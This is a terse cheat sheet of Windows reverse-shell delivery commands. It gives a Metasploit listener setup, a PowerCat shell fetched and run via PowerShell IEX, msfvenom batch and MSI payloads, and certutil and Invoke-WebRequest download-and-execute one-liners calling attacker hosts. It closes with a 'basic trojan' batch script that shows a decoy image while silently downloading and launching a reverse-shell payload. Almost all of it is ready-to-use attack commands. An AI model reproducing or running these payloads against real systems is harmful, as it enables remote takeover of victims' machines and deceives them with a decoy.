
common metasploit listener:
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT <PORT>; set ExitOnSession false; exploit -j"
```



using powercat:
```bash
attacker machine:

where powercat installed:
python3 -m http.server 9090

start netcat listener:
nc -nvlp 1234


target machine:
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.120:9090/powercat.ps1');powercat -c 192.168.1.120 -p 1234 -e cmd"
```


using batch file:
```bash
attacker machine:

msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat
python3 -m http.server 9090
nc -nvlp 4444

target systm:
Invoke-WebRequest -Uri "http://192.168.1.120:9090/shell.bat" -OutFile "$env:TEMP\shell.bat"; Start-Process "$env:TEMP\shell.bat" -WindowStyle Hidden

```

using certutil.exe :
```bash
certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
```


Msiexec.exe:
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi
```

powershell:
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=192.168.63.128 lport=3434 > reverse.bat 
```
https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/


Basic trojan:
```bash
@echo off

set "url1=https://prod-ripcut-delivery.disney-plus.net/v1/variant/disney/9B368B465A4DC909CDB6E799ACB64899B54E731B6D894FA5B080D75DB2F30533/scale?aspectRatio=1.78^&format=jpeg"
set "url2=http://192.168.63.128:8081/reverse.bat"

powershell -NoProfile -Command ^
"$urls = @('%url1%', '%url2%'); ^
foreach ($url in $urls) { ^
  $fn = Join-Path $env:TEMP ([System.IO.Path]::GetFileName($url).Split('?')[0]); ^
  try { Invoke-WebRequest -Uri $url -OutFile $fn -UseBasicParsing } catch { Write-Host 'Download failed for' $url; continue }; ^
  if (Test-Path $fn) { ^
    if ($fn -match '\.jpg$') { Start-Process mspaint.exe $fn } else { Start-Process $fn } ^
  } else { Write-Host 'File not found after download:' $fn } ^
}"
```

